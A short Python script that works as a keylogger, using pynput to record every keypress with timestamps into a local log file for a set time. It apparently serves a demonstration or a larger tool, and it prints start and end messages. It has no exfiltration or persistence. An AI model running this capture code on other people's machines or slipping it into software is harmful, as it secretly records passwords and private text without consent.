from pynput.keyboard import Listener
import logging
import os
import datetime
import multiprocessing


def keylog_action(filename):
    source_dir = os.path.dirname(os.path.abspath(__file__))
    log_dir = source_dir + "/keylog_log/"
    if not os.path.exists(log_dir):
        os.mkdir(log_dir)
    logging.basicConfig(filename=(log_dir + filename),
                        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()


def keylog(timeout_seconds=15):
    filename = "keylog_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
    process = multiprocessing.Process(target=keylog_action, args=(filename,))

    process.start()
    print("Keylog started.")
    process.join(timeout=timeout_seconds)

    if process.is_alive():
        process.terminate()
        process.join()

    print("Keylog ended.")
    return 'keylog_log/'+filename


def main():
    keylog()


if __name__ == "__main__":
    main()
